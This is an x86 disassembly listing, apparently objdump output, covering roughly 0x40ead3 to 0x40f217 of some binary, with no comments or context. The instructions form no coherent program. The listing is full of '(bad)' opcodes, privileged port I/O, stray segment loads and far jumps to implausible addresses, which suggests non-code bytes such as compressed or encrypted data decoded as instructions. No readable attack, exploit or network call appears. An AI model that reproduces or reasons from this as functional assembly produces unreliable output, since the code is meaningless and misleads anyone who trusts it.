  40ead3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ead4:	or     al,0xd0
  40ead6:	adc    eax,0xcfcc26f2
  40eadb:	pop    es
  40eadc:	mov    dl,BYTE PTR [eax+0x44]
  40eadf:	call   FWORD PTR [edx+0x48]
  40eae2:	mov    ebx,0x7d5f317c
  40eae7:	popa   
  40eae8:	xor    eax,ecx
  40eaea:	ret    
  40eaeb:	add    eax,0x9b406785
  40eaf0:	pop    esp
  40eaf1:	and    al,0xd8
  40eaf3:	mov    bh,0xec
  40eaf5:	jb     0x40ea85
  40eaf7:	int    0xe7
  40eaf9:	xor    DWORD PTR [esi+ecx*8],0xffffffdf
  40eafd:	xchg   ebx,eax
  40eafe:	addr16 stc 
  40eb00:	jmp    0x44db1cc2
  40eb05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb06:	xor    ebp,DWORD PTR [eax+ebx*1+0x6c]
  40eb0a:	pop    ds
  40eb0b:	cwde   
  40eb0c:	mov    esp,0x2a9ed8
  40eb11:	mov    DWORD PTR [ebx+0x43],esp
  40eb14:	pop    ebp
  40eb15:	push   0x9b1a482f
  40eb1a:	xor    al,0xb8
  40eb1c:	scas   al,BYTE PTR es:[edi]
  40eb1d:	pop    es
  40eb1e:	popf   
  40eb1f:	pop    esi
  40eb20:	mov    al,ds:0x811a159b
  40eb25:	das    
  40eb26:	jbe    0x40eb1b
  40eb28:	aad    0x2e
  40eb2a:	outs   dx,BYTE PTR ds:[esi]
  40eb2b:	pop    ebp
  40eb2c:	jno    0x40eb57
  40eb2e:	stos   BYTE PTR es:[edi],al
  40eb2f:	fmul   DWORD PTR [ebx]
  40eb31:	icebp  
  40eb32:	das    
  40eb33:	(bad)  
  40eb34:	shr    ebp,1
  40eb36:	call   0x3732e14c
  40eb3b:	or     al,0x7
  40eb3d:	mov    dh,0x8
  40eb3f:	dec    ecx
  40eb40:	sbb    DWORD PTR [esi],ecx
  40eb42:	dec    ebx
  40eb43:	out    0xa9,al
  40eb45:	jmp    0x40eb30
  40eb47:	adc    ah,bh
  40eb49:	loopne 0x40eb51
  40eb4b:	repz popa 
  40eb4d:	xor    al,0xab
  40eb4f:	xchg   edi,eax
  40eb50:	and    edx,ebx
  40eb52:	ret    
  40eb53:	imul   eax,DWORD PTR [esi],0x16
  40eb56:	adc    edi,DWORD PTR [edx+0x6]
  40eb59:	das    
  40eb5a:	cwde   
  40eb5b:	xchg   ebx,eax
  40eb5c:	inc    ecx
  40eb5d:	leave  
  40eb5e:	hlt    
  40eb5f:	fs xchg ecx,eax
  40eb61:	mov    bh,al
  40eb63:	sbb    BYTE PTR ds:[ebx],ah
  40eb66:	fidiv  DWORD PTR [edi]
  40eb68:	xchg   esp,eax
  40eb69:	fidivr DWORD PTR [ebx+ebx*4+0x6acde715]
  40eb70:	cwde   
  40eb71:	adc    cl,BYTE PTR [ebp+0x13]
  40eb74:	xchg   edi,eax
  40eb75:	inc    edi
  40eb76:	add    al,0xe7
  40eb78:	shl    DWORD PTR [ebx+eax*4+0x42301e00],1
  40eb7f:	retf   0x7436
  40eb82:	js     0x40ebc5
  40eb84:	loope  0x40eb25
  40eb86:	mov    al,0x46
  40eb88:	xor    al,0x35
  40eb8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb8b:	mov    WORD PTR ds:0xd722be30,ds
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	mov    ds:0x761dc367,al
  40eb97:	adc    eax,0xa510c11c
  40eb9c:	jl     0x40eb54
  40eb9e:	aaa    
  40eb9f:	std    
  40eba0:	mov    dh,0x5d
  40eba2:	mov    ecx,cs
  40eba4:	mov    ch,0x84
  40eba6:	in     al,0x88
  40eba8:	das    
  40eba9:	(bad)  
  40ebab:	mov    ds:0xc013fafd,al
  40ebb0:	pop    ss
  40ebb1:	mov    ebx,0xa0e902da
  40ebb6:	idiv   BYTE PTR [esp+ebp*4]
  40ebb9:	cld    
  40ebba:	or     eax,0x3d1d79da
  40ebbf:	add    BYTE PTR [edi-0x55224542],ch
  40ebc5:	or     BYTE PTR [esi-0x3e],dl
  40ebc8:	dec    ebx
  40ebc9:	pop    ss
  40ebca:	fist   WORD PTR [ecx-0x4e]
  40ebcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebce:	or     BYTE PTR [edi-0x7b],0x5d
  40ebd2:	jne    0x40ec25
  40ebd4:	stc    
  40ebd5:	push   cs
  40ebd6:	add    al,0x79
  40ebd8:	inc    ebp
  40ebd9:	cmc    
  40ebda:	int    0x39
  40ebdc:	int    0xcd
  40ebde:	(bad)  
  40ebdf:	sub    eax,0x5c95744
  40ebe4:	pop    ecx
  40ebe5:	pop    esp
  40ebe6:	aam    0xf8
  40ebe8:	and    eax,0xb278c17
  40ebed:	mov    ss,WORD PTR [ebp+esi*8+0x3c9bad18]
  40ebf4:	daa    
  40ebf5:	cmp    BYTE PTR [ecx-0x3a],0x97
  40ebf9:	outs   dx,WORD PTR ds:[esi]
  40ebfb:	fs in  eax,dx
  40ebfd:	(bad)  
  40ebfe:	xor    BYTE PTR [ebp+0x30],cl
  40ec01:	int    0xae
  40ec03:	cdq    
  40ec04:	cli    
  40ec05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec06:	pop    edx
  40ec07:	dec    ebx
  40ec08:	mov    ebp,0xfd41052d
  40ec0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec0e:	mov    ch,0xf0
  40ec10:	add    eax,0xb8606647
  40ec15:	mov    cl,0x83
  40ec17:	gs sbb esi,edi
  40ec1a:	ror    esi,cl
  40ec1c:	jb     0x40ebc9
  40ec1e:	fistp  DWORD PTR ds:0x91af3762
  40ec24:	jmp    0x4215:0xf2862302
  40ec2b:	mov    ecx,0x2e99e76b
  40ec30:	jmp    0x40ec6a
  40ec32:	add    ah,BYTE PTR [eax+0x1b]
  40ec35:	ja     0x40ec7b
  40ec37:	ss mov dh,0x73
  40ec3a:	nop
  40ec3b:	aam    0x4b
  40ec3d:	xchg   esi,eax
  40ec3e:	cmp    eax,0xdc961644
  40ec43:	sbb    BYTE PTR [edx+0x69302371],bh
  40ec49:	adc    eax,esp
  40ec4b:	jb     0x40ec3d
  40ec4d:	ror    BYTE PTR [ebx],0x9
  40ec50:	mov    ch,0x24
  40ec52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec53:	loop   0x40ec87
  40ec55:	in     eax,dx
  40ec56:	mov    DWORD PTR [esi-0x6b],esp
  40ec59:	daa    
  40ec5a:	mov    ebp,0x7facd061
  40ec5f:	mov    bh,0x49
  40ec61:	cs mov bl,al
  40ec64:	pop    esp
  40ec65:	xchg   esi,eax
  40ec66:	in     eax,0x80
  40ec68:	pop    ebx
  40ec69:	sub    al,0x59
  40ec6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec6c:	xchg   ecx,eax
  40ec6d:	aaa    
  40ec6e:	or     bl,bh
  40ec70:	test   eax,0x30ecd623
  40ec75:	jb     0x40ecdd
  40ec77:	cld    
  40ec78:	xlat   BYTE PTR ds:[ebx]
  40ec79:	cmc    
  40ec7a:	retf   0xeb7e
  40ec7d:	ror    cl,1
  40ec7f:	push   esp
  40ec80:	inc    edi
  40ec81:	and    BYTE PTR [eax],bh
  40ec83:	jle    0x40ec0f
  40ec85:	push   esi
  40ec86:	test   al,0xd9
  40ec88:	retf   
  40ec89:	push   edi
  40ec8a:	add    eax,0x6cfc7d3a
  40ec8f:	jbe    0x40ecba
  40ec91:	ins    DWORD PTR es:[edi],dx
  40ec92:	push   0xfffffffa
  40ec94:	out    dx,al
  40ec95:	aaa    
  40ec96:	adc    al,0xb7
  40ec98:	mov    bl,0xe3
  40ec9a:	mov    eax,0xfb5354c3
  40ec9f:	jns    0x40eccb
  40eca1:	pop    esp
  40eca2:	int    0x51
  40eca4:	xor    cl,BYTE PTR [esi]
  40eca6:	lods   al,BYTE PTR ds:[esi]
  40eca7:	outs   dx,DWORD PTR ds:[esi]
  40eca8:	(bad)  
  40eca9:	cmp    esp,esp
  40ecab:	(bad)  
  40ecac:	cld    
  40ecad:	loop   0x40ec80
  40ecaf:	dec    esi
  40ecb0:	mov    ebp,0xc94a4b05
  40ecb5:	popa   
  40ecb6:	ins    DWORD PTR es:[edi],dx
  40ecb7:	inc    edx
  40ecb8:	pushf  
  40ecb9:	cmp    BYTE PTR [ecx+0x6e97c4f5],cl
  40ecbf:	xchg   ebx,eax
  40ecc0:	repnz mov DWORD PTR [esi-0x2600b07d],edi
  40ecc7:	mov    dh,0x3a
  40ecc9:	push   ebx
  40ecca:	loop   0x40ed13
  40eccc:	sbb    DWORD PTR [ecx+0x14],esp
  40eccf:	adc    eax,0x5f53a1a6
  40ecd4:	or     BYTE PTR [esi],dl
  40ecd6:	dec    eax
  40ecd7:	in     eax,0x7f
  40ecd9:	jbe    0x40ece1
  40ecdb:	and    dl,BYTE PTR [edi-0x696c7c31]
  40ece1:	mov    eax,0x38f03e4b
  40ece6:	dec    ebx
  40ece7:	out    dx,eax
  40ece8:	mov    WORD PTR ds:0xd35c7db9,ss
  40ecee:	cdq    
  40ecef:	jmp    0xad1099c2
  40ecf4:	ins    DWORD PTR es:[edi],dx
  40ecf5:	cmp    eax,0xe3dce721
  40ecfa:	dec    edi
  40ecfb:	ss pop edx
  40ecfd:	xchg   BYTE PTR [edi-0xe],cl
  40ed00:	adc    al,0x1d
  40ed02:	in     eax,dx
  40ed03:	sbb    BYTE PTR [edx],0xea
  40ed06:	cld    
  40ed07:	jmp    0x40ed10
  40ed09:	mov    ecx,0xb84f45ec
  40ed0e:	and    dh,BYTE PTR [edx-0x2ceb74a0]
  40ed14:	sub    BYTE PTR [eax],bh
  40ed16:	stos   BYTE PTR es:[edi],al
  40ed17:	sub    esi,0x0
  40ed1a:	mov    esi,0x9a0fa8d1
  40ed1f:	mov    ss,edi
  40ed21:	push   esp
  40ed22:	scas   eax,DWORD PTR es:[edi]
  40ed23:	and    DWORD PTR [edx-0x23],esi
  40ed26:	xchg   esp,eax
  40ed27:	mov    edx,eax
  40ed29:	mov    bl,0x46
  40ed2b:	add    DWORD PTR [ebp-0x20],esi
  40ed2e:	add    al,0x97
  40ed30:	dec    esi
  40ed31:	scas   eax,DWORD PTR es:[edi]
  40ed32:	mov    al,ds:0xc096b6a1
  40ed37:	repz clc 
  40ed39:	popa   
  40ed3a:	scas   al,BYTE PTR es:[edi]
  40ed3b:	jnp    0x40ed99
  40ed3d:	stc    
  40ed3e:	ret    
  40ed3f:	or     ebp,DWORD PTR [edx-0x71]
  40ed42:	or     bh,bl
  40ed44:	data16 jge 0x40ed92
  40ed47:	sub    BYTE PTR [esi+0x4f],0x5d
  40ed4b:	sti    
  40ed4c:	sti    
  40ed4d:	sbb    eax,DWORD PTR [ebx]
  40ed4f:	push   edi
  40ed50:	jns    0x40ed3c
  40ed52:	shl    dl,cl
  40ed54:	sbb    ebp,ebp
  40ed56:	xchg   DWORD PTR [ebx],esp
  40ed58:	inc    esp
  40ed59:	inc    edx
  40ed5a:	in     eax,0x4a
  40ed5c:	pop    ebx
  40ed5d:	mov    esi,0x30c078cd
  40ed62:	push   ebp
  40ed63:	call   0x3c60af8
  40ed68:	pop    esi
  40ed69:	or     eax,0x157128ae
  40ed6e:	xchg   esp,eax
  40ed6f:	scas   al,BYTE PTR es:[edi]
  40ed70:	test   eax,0x83f41015
  40ed75:	dec    ecx
  40ed76:	cmp    eax,0x2bcfe368
  40ed7b:	jecxz  0x40ed6e
  40ed7d:	(bad)  
  40ed7e:	adc    BYTE PTR [edx+0x2d],al
  40ed81:	push   ecx
  40ed82:	mov    fs,WORD PTR [edi+0x19]
  40ed85:	sti    
  40ed86:	xlat   BYTE PTR ds:[ebx]
  40ed87:	cwde   
  40ed88:	retf   
  40ed89:	les    edx,FWORD PTR gs:[esi]
  40ed8c:	das    
  40ed8d:	icebp  
  40ed8e:	mov    ds:0xbe50c1fe,eax
  40ed93:	xchg   ebp,eax
  40ed94:	xchg   ebp,eax
  40ed95:	lock pop ecx
  40ed97:	jge    0x40ed89
  40ed99:	out    dx,al
  40ed9a:	cmp    eax,0xa3c656a1
  40ed9f:	add    al,0xd9
  40eda1:	cmc    
  40eda2:	ss mov ebp,0x476b0737
  40eda8:	mov    bh,0x84
  40edaa:	(bad)  
  40edab:	(bad)  
  40edac:	mov    al,ds:0xff01171d
  40edb1:	stos   DWORD PTR es:[edi],eax
  40edb2:	dec    edi
  40edb3:	adc    al,0xa9
  40edb5:	push   gs
  40edb7:	in     al,dx
  40edb8:	outs   dx,BYTE PTR ds:[esi]
  40edb9:	adc    cl,BYTE PTR [ebx+esi*2]
  40edbc:	dec    ebp
  40edbd:	addr16 sahf 
  40edbf:	es ins DWORD PTR es:[edi],dx
  40edc1:	fwait
  40edc2:	iret   
  40edc3:	je     0x40ed8d
  40edc5:	sbb    ebp,ecx
  40edc7:	adc    eax,edi
  40edc9:	lods   al,BYTE PTR ds:[esi]
  40edca:	or     DWORD PTR ds:0xb662cb5e,ebp
  40edd0:	jl     0x40ee0c
  40edd2:	and    DWORD PTR [ecx-0x1d],ebx
  40edd5:	cdq    
  40edd6:	pop    ebx
  40edd7:	ret    0xecb5
  40edda:	and    al,0xe2
  40eddc:	push   ss
  40eddd:	xchg   DWORD PTR [edx+0xd],ebp
  40ede0:	iret   
  40ede1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ede2:	scas   al,BYTE PTR es:[edi]
  40ede3:	pushaw 
  40ede5:	sub    DWORD PTR [eax],esp
  40ede7:	fwait
  40ede8:	mov    al,ds:0x7c6dd384
  40eded:	jmp    0xbf232394
  40edf2:	out    dx,al
  40edf3:	mov    esi,0x4d6ff4f2
  40edf8:	mov    ebx,0xadde1d9d
  40edfd:	pop    edi
  40edfe:	clc    
  40edff:	dec    esi
  40ee00:	ins    BYTE PTR es:[edi],dx
  40ee01:	mov    edi,0x87e49df1
  40ee06:	mov    dl,0x5a
  40ee08:	jne    0x40ee57
  40ee0a:	outs   dx,BYTE PTR ds:[esi]
  40ee0b:	jne    0x40ee4b
  40ee0d:	clc    
  40ee0e:	ins    DWORD PTR es:[edi],dx
  40ee0f:	iret   
  40ee10:	out    dx,eax
  40ee11:	and    eax,0x441f2ea
  40ee16:	jno    0x40ee36
  40ee18:	jno    0x40edd7
  40ee1a:	add    DWORD PTR [ecx+0x6aa656ea],0x50
  40ee21:	xlat   BYTE PTR ds:[ebx]
  40ee22:	das    
  40ee23:	or     ah,dh
  40ee25:	inc    esp
  40ee26:	jmp    0x40ee78
  40ee28:	push   esi
  40ee29:	sub    ebp,DWORD PTR [ecx+0x36]
  40ee2c:	xor    BYTE PTR [esi+ebx*4],0x13
  40ee30:	fisubr DWORD PTR [edi]
  40ee32:	sti    
  40ee33:	out    dx,eax
  40ee34:	push   ds
  40ee35:	push   0xf818e16c
  40ee3a:	jmp    0x40eeb7
  40ee3c:	add    bh,bh
  40ee3e:	mov    dh,0x8c
  40ee40:	pushf  
  40ee41:	les    ebp,FWORD PTR [edx+0x66ced511]
  40ee47:	dec    sp
  40ee49:	shr    DWORD PTR [eax],cl
  40ee4b:	fucom  st(0)
  40ee4d:	push   ss
  40ee4e:	out    dx,al
  40ee4f:	sbb    eax,0xceb8484d
  40ee54:	inc    edx
  40ee55:	or     BYTE PTR [ecx],bh
  40ee57:	pop    esi
  40ee58:	popa   
  40ee59:	adc    ebx,DWORD PTR [edx+0x705c8a12]
  40ee5f:	mov    edx,0xdc7e00df
  40ee64:	out    dx,al
  40ee65:	pushf  
  40ee66:	xor    al,ch
  40ee68:	xchg   esp,eax
  40ee69:	ja     0x40ee33
  40ee6b:	and    BYTE PTR [ecx],dl
  40ee6d:	shr    BYTE PTR [ebx],0x71
  40ee70:	out    0xe7,eax
  40ee72:	inc    ecx
  40ee73:	push   0xffffffd4
  40ee75:	aad    0x67
  40ee77:	xchg   BYTE PTR [edx],ch
  40ee79:	jl     0x40ee13
  40ee7b:	or     edi,ebp
  40ee7d:	jecxz  0x40ee06
  40ee7f:	mov    ebx,0x558e5dc4
  40ee84:	jns    0x40ee16
  40ee86:	xor    DWORD PTR [eax],ebx
  40ee88:	retf   0xd7e9
  40ee8b:	jmp    0x202c9b96
  40ee90:	mov    BYTE PTR [ebx+0x13],al
  40ee93:	sub    esi,DWORD PTR [ecx-0x73bbf3af]
  40ee99:	pop    ebp
  40ee9a:	xchg   ecx,eax
  40ee9b:	ins    DWORD PTR es:[edi],dx
  40ee9c:	jno    0x40ee69
  40ee9e:	cmp    eax,0x521112b8
  40eea3:	mov    bh,0x1c
  40eea5:	xor    eax,0xc2a00999
  40eeaa:	and    al,0x23
  40eeac:	and    DWORD PTR [ebx+0x20],ecx
  40eeaf:	dec    eax
  40eeb0:	lds    esp,FWORD PTR [edx]
  40eeb2:	push   0xf7c9d643
  40eeb7:	inc    ebx
  40eeb8:	repz mov cl,0x35
  40eebb:	and    bh,BYTE PTR ds:0xcba75bb9
  40eec1:	sub    BYTE PTR [ecx-0x6505aaf3],cl
  40eec7:	cmp    esi,DWORD PTR [eax]
  40eec9:	add    BYTE PTR [ebx],0x2
  40eecc:	push   cs
  40eecd:	shl    BYTE PTR [ebp-0x77028277],0xda
  40eed4:	push   esi
  40eed5:	call   0x9f7d:0x352d2700
  40eedc:	cdq    
  40eedd:	jbe    0x40ef4a
  40eedf:	jmp    0x40ef3e
  40eee1:	dec    esp
  40eee2:	dec    eax
  40eee3:	inc    esp
  40eee4:	repnz pop ebp
  40eee6:	pop    ebp
  40eee7:	adc    ecx,DWORD PTR [ebp-0x54d80c0c]
  40eeed:	(bad)  
  40eeee:	enter  0xa3d4,0x80
  40eef2:	es add dl,dh
  40eef5:	add    BYTE PTR [edx+edi*4],al
  40eef8:	sbb    eax,0xfa03755d
  40eefd:	sub    bh,BYTE PTR [edx]
  40eeff:	xchg   BYTE PTR [ebp-0x6e9dd84e],bh
  40ef05:	lds    ebx,FWORD PTR [eax+esi*1+0x30]
  40ef09:	lods   eax,DWORD PTR ds:[esi]
  40ef0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef0b:	mov    al,0xb1
  40ef0d:	pop    eax
  40ef0e:	sbb    al,0x9f
  40ef10:	and    al,0x9a
  40ef12:	xor    DWORD PTR [esi+0x13],esp
  40ef15:	adc    BYTE PTR [eax+0x63640a4d],0x38
  40ef1c:	dec    edx
  40ef1d:	add    eax,0xf686ad55
  40ef22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef23:	mov    ds:0xff0e5eae,al
  40ef28:	mov    ds:0x192c53fb,eax
  40ef2d:	aad    0xaf
  40ef2f:	out    dx,eax
  40ef30:	fist   WORD PTR [ecx+0x7b]
  40ef33:	cs push ebx
  40ef35:	pop    esi
  40ef36:	xchg   ebx,eax
  40ef37:	xor    al,0xe2
  40ef39:	aas    
  40ef3a:	mov    edx,0xc14c65d5
  40ef3f:	fimul  WORD PTR [edi]
  40ef41:	cwde   
  40ef42:	and    eax,DWORD PTR [ecx-0x19]
  40ef45:	or     edi,esp
  40ef47:	mov    al,0x6a
  40ef49:	jle    0x40efa9
  40ef4b:	fwait
  40ef4c:	cld    
  40ef4d:	and    dh,BYTE PTR [ebx+0x624366a8]
  40ef53:	mov    eax,ds:0x33b2c248
  40ef58:	mul    bl
  40ef5a:	int3   
  40ef5b:	add    BYTE PTR [eax],ah
  40ef5d:	les    ecx,FWORD PTR [edx-0x21942b5e]
  40ef63:	sbb    dl,BYTE PTR [eax-0x6f798f59]
  40ef69:	and    eax,0xeebbf7ef
  40ef6e:	hlt    
  40ef6f:	xlat   BYTE PTR ds:[ebx]
  40ef70:	idiv   BYTE PTR [ecx+ebp*1-0x1a0f1b0]
  40ef77:	mov    ebx,0x966a85f9
  40ef7c:	les    ebp,FWORD PTR [esi-0x4b28aac0]
  40ef82:	ja     0x40ef66
  40ef84:	push   ss
  40ef85:	sar    ebx,1
  40ef87:	dec    esi
  40ef88:	hlt    
  40ef89:	mov    eax,ds:0x4f5b5310
  40ef8e:	mov    ds:0x7bb0667a,al
  40ef93:	xchg   ebp,eax
  40ef94:	jne    0x40efe6
  40ef96:	mov    ch,0x10
  40ef98:	ret    0x5fad
  40ef9b:	in     al,dx
  40ef9c:	push   0xffffffe9
  40ef9e:	jmp    0x40efff
  40efa0:	mov    bh,0x30
  40efa2:	jp     0x40efb4
  40efa4:	int3   
  40efa5:	cdq    
  40efa6:	or     eax,0x98a0de24
  40efab:	aam    0x37
  40efad:	gs push ecx
  40efaf:	mov    edi,0x151db34b
  40efb4:	and    DWORD PTR [edi-0x16ff9111],0x464a65b0
  40efbe:	xor    bl,dh
  40efc0:	sub    edx,DWORD PTR [eax-0x45]
  40efc3:	call   0x20d88717
  40efc8:	test   al,0xf9
  40efca:	push   ds
  40efcb:	adc    BYTE PTR [ebx-0x7c],bl
  40efce:	aam    0xe7
  40efd0:	(bad)  
  40efd1:	and    al,0x81
  40efd3:	or     esi,DWORD PTR [ebp+0x6b6a8afd]
  40efd9:	jb     0x40efa7
  40efdb:	jno    0x40efdc
  40efdd:	sbb    eax,0xd660a40d
  40efe2:	fnsetpm(287 only) 
  40efe4:	stc    
  40efe5:	sub    ah,BYTE PTR [ebp+0x3a040f7a]
  40efeb:	xchg   ebx,eax
  40efec:	mov    edx,0xe6c55b3b
  40eff1:	in     eax,0xee
  40eff3:	cld    
  40eff4:	mov    fs,ecx
  40eff6:	mov    ecx,0x854a0b3e
  40effb:	push   ds
  40effc:	xor    cl,BYTE PTR [ebp+0x75]
  40efff:	mov    al,0x8f
  40f001:	das    
  40f002:	(bad)  
  40f003:	in     al,0x15
  40f005:	out    dx,al
  40f006:	nop
  40f007:	loope  0x40efbd
  40f009:	fisubr DWORD PTR [ebp+0x596005c2]
  40f00f:	push   es
  40f010:	inc    ecx
  40f011:	xchg   ebx,eax
  40f012:	push   esi
  40f013:	(bad)  
  40f014:	sub    bh,BYTE PTR ds:0x7c3851de
  40f01a:	jge    0x40f072
  40f01c:	dec    ebp
  40f01d:	xchg   edx,eax
  40f01e:	jno    0x40f09e
  40f020:	mov    edx,DWORD PTR [ebx+0x62]
  40f023:	mov    ecx,edi
  40f025:	push   cs
  40f026:	xor    ah,ah
  40f028:	sub    al,0x48
  40f02a:	jecxz  0x40f097
  40f02c:	mov    esi,DWORD PTR [esi-0x1b]
  40f02f:	shr    dl,0xba
  40f032:	adc    al,0x7
  40f034:	and    BYTE PTR [ebx+0x3237ee67],bl
  40f03a:	sar    DWORD PTR ds:[eax+ebx*1],cl
  40f03e:	retf   0xa96c
  40f041:	mov    eax,0x521a03f5
  40f046:	and    eax,0x1590dc2a
  40f04b:	nop
  40f04c:	mov    eax,0xe3b1d708
  40f051:	fldenv [ebx-0x415ba7a2]
  40f057:	shufps xmm2,XMMWORD PTR ds:0x6278aa20,0x72
  40f05f:	nop
  40f060:	lea    edx,[ebx+0x2c]
  40f063:	jb     0x40f0d0
  40f065:	jno    0x40f099
  40f067:	jg     0x40efef
  40f069:	stc    
  40f06a:	pop    es
  40f06b:	sub    bh,BYTE PTR [ecx+0x29]
  40f06e:	lea    esp,[edx-0x23]
  40f071:	aad    0x73
  40f073:	es or  al,0xdd
  40f076:	je     0x40f03e
  40f078:	lahf   
  40f079:	fwait
  40f07a:	imul   ebx,DWORD PTR ds:0xec67fd3e,0x269859a4
  40f084:	sbb    eax,0x22aa4a8f
  40f089:	mov    ds:0x9189c39f,al
  40f08e:	push   edi
  40f08f:	add    al,0xbd
  40f091:	jg     0x40f09c
  40f093:	pushf  
  40f094:	(bad)  
  40f096:	adc    BYTE PTR [ebx+eiz*8],dh
  40f099:	gs jge 0x40f0a0
  40f09c:	dec    esp
  40f09d:	jnp    0x40f03f
  40f09f:	inc    edi
  40f0a0:	cmp    cl,BYTE PTR [edx+0x54]
  40f0a3:	mov    dl,0x1b
  40f0a5:	pop    ebx
  40f0a6:	scas   eax,DWORD PTR es:[edi]
  40f0a7:	jmp    0xf7e2:0x10cc4ea0
  40f0ae:	push   edi
  40f0af:	ficom  DWORD PTR [eax-0x2f3a0caf]
  40f0b5:	mov    ebp,0x408fcdc1
  40f0ba:	xchg   ecx,eax
  40f0bb:	out    dx,eax
  40f0bc:	xor    eax,0x4c3ab564
  40f0c1:	fsqrt  
  40f0c3:	imul   ebp,DWORD PTR [ecx],0x9c4a4fba
  40f0c9:	dec    ecx
  40f0ca:	cmp    esi,ebp
  40f0cc:	retf   
  40f0cd:	xor    BYTE PTR [ebx-0x496f44cb],0x29
  40f0d4:	stos   DWORD PTR es:[edi],eax
  40f0d5:	in     eax,dx
  40f0d6:	popf   
  40f0d7:	cmp    eax,0x559f30e0
  40f0dc:	jb     0x40f091
  40f0de:	cs and eax,0xc46956d7
  40f0e4:	arpl   WORD PTR [esi-0x14],di
  40f0e7:	fdivr  QWORD PTR [edi-0x59cf4758]
  40f0ed:	pusha  
  40f0ee:	xor    DWORD PTR [eax+0x25],edi
  40f0f1:	js     0x40f134
  40f0f3:	pop    edx
  40f0f4:	jo     0x40f0cd
  40f0f6:	fld    QWORD PTR [eax]
  40f0f8:	out    dx,eax
  40f0f9:	scas   eax,DWORD PTR es:[edi]
  40f0fa:	pop    edi
  40f0fb:	es add al,al
  40f0fe:	mov    ecx,0xb03837dc
  40f103:	jg     0x40f13b
  40f105:	mov    ds,WORD PTR ds:0x5e78ba61
  40f10b:	ja     0x40f170
  40f10d:	or     DWORD PTR [ecx+0x67],ebx
  40f110:	sbb    cl,BYTE PTR [ecx]
  40f112:	mov    ds:0x3a7d7e6c,al
  40f117:	mov    al,0xea
  40f119:	out    0x59,ax
  40f11c:	in     eax,dx
  40f11d:	in     al,dx
  40f11e:	push   ds
  40f11f:	(bad)  
  40f121:	mov    BYTE PTR [esp+ebp*4],bh
  40f124:	sub    bl,BYTE PTR [edx-0x88e02d]
  40f12a:	jle    0x40f148
  40f12c:	cld    
  40f12d:	(bad)  
  40f12e:	aam    0xaf
  40f130:	arpl   WORD PTR ds:0x37b26d78,dx
  40f136:	xchg   BYTE PTR [edx-0x33],bh
  40f139:	mov    bh,0xbf
  40f13b:	arpl   WORD PTR [eax+0x3060a2c2],cx
  40f141:	xor    DWORD PTR [edi-0x7094551f],edx
  40f147:	mov    ecx,0xb1bf3c2a
  40f14c:	pop    ss
  40f14d:	imul   esp,DWORD PTR gs:[esi+esi*1-0x11],0x6ccb81cc
  40f156:	lods   al,BYTE PTR ds:[esi]
  40f157:	mov    DWORD PTR [edi],esi
  40f159:	fist   DWORD PTR [esi+0x39]
  40f15c:	call   ecx
  40f15e:	add    al,0x6a
  40f160:	adc    eax,0x211717ec
  40f165:	lock inc ebp
  40f167:	xchg   ecx,eax
  40f168:	ins    DWORD PTR es:[edi],dx
  40f169:	retf   0x9bd6
  40f16c:	(bad)  
  40f16d:	jnp    0x40f133
  40f16f:	mov    dl,0x76
  40f171:	push   ecx
  40f172:	enter  0xf254,0xc6
  40f176:	sub    DWORD PTR [ecx],ebp
  40f178:	loop   0x40f13c
  40f17a:	das    
  40f17b:	xor    al,0x2a
  40f17d:	mov    esp,0x38b81071
  40f182:	cld    
  40f183:	and    BYTE PTR [esi+ebx*1+0x3b],al
  40f187:	mov    ch,0x48
  40f189:	les    ebx,FWORD PTR [esi+0x69]
  40f18c:	dec    edx
  40f18d:	aaa    
  40f18e:	and    BYTE PTR [esi],ah
  40f190:	lea    ebx,[ebp-0x6]
  40f193:	jns    0x40f11b
  40f195:	fdivr  st,st(6)
  40f197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f198:	xlat   BYTE PTR ds:[ebx]
  40f199:	aad    0xc1
  40f19b:	mov    BYTE PTR [edx],bl
  40f19d:	inc    edi
  40f19e:	pop    ebx
  40f19f:	data16 aad 0xa4
  40f1a2:	mov    edx,0xb54e8200
  40f1a7:	add    al,0xe5
  40f1a9:	push   0xffffffb9
  40f1ab:	lods   eax,DWORD PTR ds:[esi]
  40f1ac:	pop    ds
  40f1ad:	mov    eax,ds:0x4af6e2d
  40f1b2:	shr    eax,0x2a
  40f1b5:	add    al,0x78
  40f1b7:	mov    esi,0xd216b7fb
  40f1bc:	add    BYTE PTR [edx+0x3d9173ff],bl
  40f1c2:	adc    dh,ah
  40f1c4:	ds clc 
  40f1c6:	sub    cl,al
  40f1c8:	add    esp,DWORD PTR [edx+eax*4-0x3e6395ec]
  40f1cf:	inc    ebx
  40f1d0:	jbe    0x40f1bd
  40f1d2:	sub    al,0x4a
  40f1d4:	ds stos BYTE PTR es:[edi],al
  40f1d6:	add    al,0x63
  40f1d8:	push   ecx
  40f1d9:	add    eax,0x37c57415
  40f1de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1df:	aaa    
  40f1e0:	enter  0x767a,0x2c
  40f1e4:	ja     0x40f1c8
  40f1e6:	sub    bl,BYTE PTR [edi-0x120be96d]
  40f1ec:	push   es
  40f1ed:	in     al,dx
  40f1ee:	fst    st(4)
  40f1f0:	xchg   edx,eax
  40f1f1:	jge    0x40f22d
  40f1f3:	jno    0x40f1c2
  40f1f5:	mov    ebp,0xb312ddbf
  40f1fa:	enter  0xba71,0x24
  40f1fe:	test   DWORD PTR es:[edx-0x7fa6665c],ebp
  40f205:	mov    edi,0x8031d801
  40f20a:	mov    ch,0x86
  40f20c:	in     eax,dx
  40f20d:	rcl    DWORD PTR [esi],cl
  40f20f:	daa    
  40f210:	data16 (bad) 
  40f213:	ret    
  40f214:	sub    edi,eax
  40f216:	xlat   BYTE PTR ds:[ebx]
  40f217:	in     al,dx
